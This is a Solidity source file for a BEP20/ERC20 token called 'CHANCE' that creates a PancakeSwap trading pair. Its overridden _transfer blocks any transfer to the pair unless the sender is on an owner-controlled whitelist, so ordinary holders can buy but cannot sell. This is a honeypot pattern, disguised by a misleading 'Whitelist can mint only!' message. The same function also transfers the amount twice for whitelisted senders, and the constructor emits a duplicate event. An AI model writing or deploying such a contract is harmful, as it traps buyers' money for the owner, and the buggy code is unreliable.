pragma solidity ^0.8.7;

contract CHANCE is ERC20, Ownable {

    using SafeMath for uint256;
    IPancakeV2Router02 public pancakeV2Router;
    address public immutable pancakeV2Pair;
    mapping (address => bool) public Whitelist;

    constructor() ERC20("CHANCE", "CHCE") {
        
        IPancakeV2Router02 _pancakeV2Router = IPancakeV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
         
        address _pancakeV2Pair = IPancakeV2Factory(_pancakeV2Router.factory())
            .createPair(address(this), _pancakeV2Router.WETH());

        pancakeV2Router = _pancakeV2Router;
        pancakeV2Pair = _pancakeV2Pair;
        
        _mint(owner(), 200000000000 * 10 ** 18);
        emit Transfer(address(0), msg.sender, totalSupply());
    }
    
    function burn (uint256 amount) public onlyOwner {
        _burn(msg.sender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if(to == pancakeV2Pair){
            require(Whitelist[msg.sender] == true,"Whitelist can mint only!");
            super._transfer(from, to, amount);
        }
        super._transfer(from, to, amount);
    }

    function whitelist(address _address) public onlyOwner returns (bool){
        Whitelist[_address] = true;
        return true;
    } 


}
